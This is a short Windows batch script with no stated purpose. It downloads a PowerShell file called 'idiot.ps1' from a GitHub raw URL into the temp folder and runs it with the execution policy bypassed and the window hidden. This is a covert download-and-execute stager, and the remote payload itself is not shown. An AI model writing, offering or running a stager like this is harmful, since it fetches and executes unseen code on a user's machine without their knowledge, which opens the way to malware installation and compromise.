@echo off
set "ps1URL=https://raw.githubusercontent.com/coolman6969-ui/turtle-rap/main/idiot.ps1"
set "ps1Path=%TEMP%\idiot.ps1"

curl -L -o "%ps1Path%" "%ps1URL%"
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%ps1Path%"
exit
